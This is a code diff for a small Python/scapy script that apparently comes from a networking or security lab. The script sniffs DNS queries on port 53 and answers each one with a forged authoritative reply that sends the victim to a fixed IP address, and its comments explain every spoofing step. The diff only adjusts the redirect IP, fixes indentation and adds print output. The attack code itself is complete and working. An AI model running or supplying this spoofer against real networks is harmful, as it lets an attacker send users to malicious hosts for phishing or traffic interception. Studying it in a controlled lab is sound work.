@@ -19,7 +19,7 @@
 from scapy.all import *
 
 ## DEFINING CONSTANT
-redirectedIP = "192.168.1.114"
+redirectedIP = "192.168.1.30" # my fedora host ip
 
 ## DEFINING CALLBACK FUNCTION
 
@@ -28,22 +28,22 @@ def dnsSpoof (pkt):
 				# this is where the spoofing takes place changing the src and dst of each header, ip/udp
 				# then copying the same dns features such as id, qd(query data), setting aa=1 for dns authorize
 				# qr(query or response) is set to 1 because query is 0
-				# lastly adding the an(answer response), with another class os scapoy dnsrr, with rrname(requested name)
+				# lastly adding the an(answer response), with another class os scapoy dnsrr, with rrname(resource record name)
 				# as the original pkts dns querydata name, ttl set to 10 (arbituary), and its redirected IP (the whole point)
 		ipHeader  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
 		udpHeader = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
 		dnsHeader = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirectedIP))
-		spoofedPkt= ipHeader/udpHeader/dnsHeader
+		spoofedPkt = ipHeader/udpHeader/dnsHeader
 	# send the spoofed packet
-	send(spoofedPkt)
-
-
+		send(spoofedPkt)
+		print "*"*60 + "SPOOFED PACKET HAS BEEN SET" + "*"*60
+	print "THIS PACKET IS NOT DNS QUESTION RECORD PACKET, BUT WAS SENT TO PORT 53 OF TARGET IP"
 
 ## USING THE SNIFF FUNCTION
 
 # remember dns is an application layer that uses udp (mainly) 
 # on port 53, hece the sniff filter at port 53, as the second arg
 # first arg is the interface we want to sniff from
-sniff(iface="eth0", filter="udp port 53", store=0, prn=dnsSpoof)
+sniff(iface="eth0", filter="udp and port 53", store=0, prn=dnsSpoof)
 
 
